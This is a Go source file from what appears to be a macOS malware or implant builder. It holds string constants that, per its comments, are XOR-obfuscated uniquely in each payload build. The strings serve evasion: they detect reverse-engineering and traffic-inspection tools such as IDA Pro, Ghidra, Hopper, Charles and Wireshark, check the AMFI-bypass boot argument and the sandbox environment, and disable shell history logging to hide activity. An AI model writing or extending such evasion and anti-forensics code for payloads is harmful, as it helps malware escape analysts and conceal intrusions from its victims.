package utils

// PLACEHOLDER — overwritten at build-time by pl_main.go:generateObfuscatedStrings().
// Each payload build generates a unique XOR key and re-encodes all strings.
// These plaintext fallbacks exist only for dev-time compilation (go vet, IDE).

func StrHwModel() string          { return "hw.model" }
func StrKernBootargs() string     { return "kern.bootargs" }
func StrAmfiBypass() string       { return "amfi_get_out_of_my_way" }
func StrSandboxEnv() string       { return "APP_SANDBOX_CONTAINER_ID" }
func StrHopper() string           { return "/Applications/Hopper Disassembler v4.app" }
func StrIDA() string              { return "/Applications/IDA Pro.app" }
func StrGhidra() string           { return "/Applications/Ghidra.app" }
func StrCharles() string          { return "/Applications/Charles.app" }
func StrProxyman() string         { return "/Applications/Proxyman.app" }
func StrWireshark() string        { return "/Applications/Wireshark.app" }
func StrSystemVersionPlist() string { return "/System/Library/CoreServices/SystemVersion.plist" }
func StrProductVersion() string   { return "ProductVersion" }
func StrMacOS() string            { return "MacOS" }
func StrHistfile() string         { return "HISTFILE=/dev/null" }
func StrHistfilesize() string     { return "HISTFILESIZE=0" }
func StrHistsize() string         { return "HISTSIZE=0" }
func StrHistory() string          { return "HISTORY=" }
func StrHistsave() string         { return "HISTSAVE=" }
func StrHistzone() string         { return "HISTZONE=" }
func StrHistlog() string          { return "HISTLOG=" }
